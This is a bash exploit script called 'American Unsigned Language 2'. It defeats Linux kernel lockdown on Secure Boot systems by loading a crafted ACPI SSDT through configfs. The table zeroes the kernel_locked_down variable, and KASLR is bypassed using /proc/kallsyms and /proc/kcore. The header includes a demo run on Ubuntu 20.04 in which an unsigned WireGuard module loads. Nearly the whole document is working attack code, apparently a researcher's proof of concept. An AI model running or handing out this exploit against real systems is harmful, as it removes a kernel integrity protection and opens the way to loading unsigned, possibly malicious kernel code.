#!/bin/bash

# American Unsigned Language 2
# ============================
# by zx2c4, 2020-06-14
#
# This sequel is an improvement on American Unsigned Language, in that it works
# on mainline kernels and does not require any reboots.
#
# The configfs module for acpi allows us to add arbitrary acpi tables at
# runtime, enabling us to write to physical addresses arbitrarily.  This
# exploit uses that to disable lockdown, which enables one to load unsigned
# kernel drivers into systems with Secure Boot enabled, without needing to sign
# the modules.
#
# This works around KASLR by getting the physical base from /proc/kcore and
# the randomized kernel symbol addresses from /proc/kallsysm. If we didn't
# have access to kcore, we could just append nokaslr like in the prior version,
# and use normal old /proc/iomem, which works fine.
#
# The \_SB_.GSIF._STA method is used, because SSDTs loaded this way cannot
# overwrite DSDT methods, but they can add new ones, and on the QEMU rig used
# to develop this, \_SB_.GSIF._STA was not defined, even though the kernel was
# evaluating it. Depending on your platform, you may wish to use a different
# method.
#
# Demo time:
#
# 1) First we show which kernel we're running. We test with Ubuntu 20.04's 5.4
#    kernel, since it's already signed and works for our purposes:
#
# zx2c4@focalpoint:~$ uname -a
# Linux focalpoint 5.4.0-37-generic #41-Ubuntu SMP Wed Jun 3 18:57:02 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
#
# 2) Observe that we can't load unsigned WireGuard:
#
# zx2c4@focalpoint:~$ sudo modprobe wireguard
# modprobe: ERROR: could not insert 'wireguard': Required key not available
#
# 3) Run the exploit:
#
# zx2c4@focalpoint:~$ ./american-unsigned-language-2.sh
# [+] Checking lockdown status
#  *  lockdown = integrity
# [+] Resolving kernel symbols
#  *  kernel_locked_down = 0xffffffffbd54d5a4
# [+] Mapping virtual address to physical address
#  *  phys_base = 0x1b3c00000
#  *  kernel_locked_down = 0x1f114d5a4
# [+] Constructing ASL
# [+] Installing ASL
# [+] Checking lockdown status
#  *  lockdown = none
# [+] Success
#
# 4) Check that it works:
#
# zx2c4@focalpoint:~$ sudo modprobe wireguard
# zx2c4@focalpoint:~$ dmesg | grep WireGuard
# [   73.469158] wireguard: WireGuard 1.0.20200611 loaded. See www.wireguard.com for information.

set -e

SELF="$(readlink -f "${BASH_SOURCE[0]}")"
[[ $UID == 0 ]] || exec sudo -- "$BASH" -- "$SELF" "$@"

echo "===================================="
echo "=   American Unsigned Language 2   ="
echo "=            by zx2c4              ="
echo "===================================="

lockdown_status() {
	echo "[+] Checking lockdown status"
	[[ $(< /sys/kernel/security/lockdown) =~ \[([a-z]+)\] ]]
	echo " *  lockdown = ${BASH_REMATCH[1]}"
	if [[ ${BASH_REMATCH[1]} == none ]]; then
		echo "[+] Success"
		exit 0
	fi
}

lockdown_status

if ! command -v iasl >/dev/null 2>&1; then
	if command -v apt-get >/dev/null 2>&1; then
		echo "[+] Installing dependencies"
		apt-get install -y acpica-tools
	elif command -v yum >/dev/null 2>&1; then
		echo "[+] Installing dependencies"
		yum install -y acpica-tools
	else
		echo "[-] Install iasl and try again"
		exit 1
	fi
fi

echo "[+] Resolving kernel symbols"
read -r addr type symbol < <(grep -F kernel_locked_down /proc/kallsyms)
[[ $symbol == kernel_locked_down ]]
addr=$(( 0x$addr ))
printf ' *  kernel_locked_down = 0x%x\n' "$addr"

echo "[+] Mapping virtual address to physical address"
# We could use /proc/iomem instead and disable kaslr if /proc/kcore isn't possible
IFS== read -r _ phys_base < <(grep -aFm 1 phys_base /proc/kcore)
printf ' *  phys_base = 0x%x\n' "$phys_base"
addr=$(( $addr - 0xffffffff80000000 + $phys_base ))
# If the system DSDT is version 1 instead of 2, and addr is > 2^32-1, then
# we'll fail to address it. This should be pretty rare on real hardware though.
printf ' *  kernel_locked_down = 0x%x\n' "$addr"

echo "[+] Constructing ASL"
trap 'rm -f /root/trigger.aml' EXIT
iasl -p "/root/trigger" /dev/stdin > /dev/null <<-_EOF
	DefinitionBlock ("trigger.aml", "SSDT", 2, "", "", 0x00001001) {
	  External (\_SB_.GSIF, DeviceObj)
	  OperationRegion (KMEM, SystemMemory, $(printf '0x%x' "$addr"), 4)
	  Field (KMEM, DWordAcc, NoLock, WriteAsZeros) {
	    LKDN, 32
	  }
	  Method (\_SB_.GSIF._STA) {
	    LKDN = Zero
	    Return (Zero)
	  }
	}
_EOF

echo "[+] Installing ASL"
modprobe acpi_configfs
[[ -d /sys/kernel/config/acpi/table/aml ]] && rmdir /sys/kernel/config/acpi/table/aml
mkdir -p /sys/kernel/config/acpi/table/aml
cat /root/trigger.aml > /sys/kernel/config/acpi/table/aml/aml
sleep 0.5

lockdown_status
echo "[-] Failure"
